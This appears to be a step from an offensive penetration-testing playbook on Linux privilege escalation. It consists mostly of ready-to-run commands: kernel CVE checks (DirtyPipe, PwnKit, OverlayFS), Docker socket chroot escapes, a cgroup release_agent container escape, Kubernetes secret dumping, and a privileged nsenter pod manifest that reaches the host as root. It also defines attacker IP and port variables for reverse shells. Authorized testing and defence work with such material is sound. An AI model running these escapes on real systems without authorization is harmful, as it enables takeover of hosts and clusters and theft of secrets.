# Privilege Escalation — Impact Escalation (Kernel, Docker, Kubernetes)

## Purpose
Escalate via kernel exploits, container escape, and orchestration layer abuse when SUID/sudo vectors are exhausted.

## Required Variables
- \$LHOST: attacker IP for reverse shells
- \$LPORT: attacker listener port

## Commands

```bash
uname -r | tee /tmp/kernel_version.txt

grep -E '^5\.(8|9|1[0-6])' /proc/version && echo "Potentially vulnerable to DirtyPipe" | tee /tmp/dirtypipe_check.txt

pkexec --version 2>/dev/null | grep -E '0\.105' && echo "Potentially vulnerable to PwnKit (CVE-2021-4034)" | tee /tmp/pwnkit_check.txt

cat /proc/version | grep -i ubuntu | grep -E '4\.4\.0-(2[1-9]|[3-9][0-9]|1[01][0-9]|120)' && echo "Potentially vulnerable to OverlayFS (CVE-2021-3493)" | tee /tmp/overlayfs_check.txt
```

Docker socket escape:

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh 2>/dev/null

docker -H unix:///var/run/docker.sock run -v /:/host -it alpine sh -c "chroot /host bash -c 'id'" 2>/dev/null

docker -H unix:///var/run/docker.sock run --privileged -v /:/host -it ubuntu chroot /host /bin/bash 2>/dev/null
```

Privileged container cgroup escape:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output 2>/dev/null && echo "Cgroup escape successful" | tee /tmp/cgroup_escape.txt
```

Kubernetes service account abuse:

```bash
kubectl auth can-i --list 2>/dev/null | tee /tmp/k8s_perms.txt

kubectl get pods --all-namespaces 2>/dev/null | tee /tmp/k8s_pods.txt

kubectl get secrets --all-namespaces 2>/dev/null | tee /tmp/k8s_secrets.txt

kubectl exec -it $(kubectl get pods -o name | head -1) -- /bin/sh 2>/dev/null
```

```bash
kubectl create -f - <<'EOF' 2>/dev/null
apiVersion: v1
kind: Pod
metadata:
  name: privesc
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: privesc
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "nsenter -t 1 -m -u -i -n -p -- /bin/sh -c 'id > /tmp/host_root.txt'"]
    securityContext:
      privileged: true
EOF
kubectl logs privesc 2>/dev/null
```

## Detection Signals
- `docker -H unix:///var/run/docker.sock` commands return output without `permission denied`
- `kubectl auth can-i` returns `create` and `get` for `pods` resource
- Privileged container can mount host filesystem — `id` returns `uid=0(root)` after chroot
- cgroup `release_agent` path writable and triggers root command execution
- Kernel version matching known CVE (DirtyPipe, PwnKit, OverlayFS) with exploit-db PoC

## Next
├── If root obtained → go to 05-evidence-collection
├── If node/pod compromise escalated to cluster admin → go to 05-evidence-collection
├── If kernel exploit compiled and failed → go to 06-false-positive-filter
├── If all vectors exhausted → return to 02-probe for deeper enumeration